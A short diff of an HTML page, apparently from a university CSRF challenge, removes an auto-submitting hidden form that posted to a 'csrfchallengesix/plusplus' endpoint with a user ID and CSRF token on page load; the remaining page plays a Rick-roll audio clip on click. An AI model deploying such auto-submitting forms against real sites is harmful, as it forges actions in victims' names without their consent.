@@ -1,9 +1,6 @@
 <html>
   <head>
     <script>
-      window.onload = () => {
-        document.forms.auto.submit();
-      }
       window.addEventListener("click", (event) => {
         document.querySelector("#rick").play();
       });
@@ -13,9 +10,6 @@
     </script>
   </head>
   <body>
-    <form action="https://snickerboa.it.liu.se/user/csrfchallengesix/plusplus?userId=0e516a5efe478ccbe54c24e1d5eb2c2f2bc856be&csrfToken=eccbc87e4b5ce2fe28308fd9f2a7baf3" name="auto" method="POST">
-      <input type="hidden" />
-    </form>
     <audio src="./rick.mp3" id="rick" autoplay></audio>
   </body>
 </html>
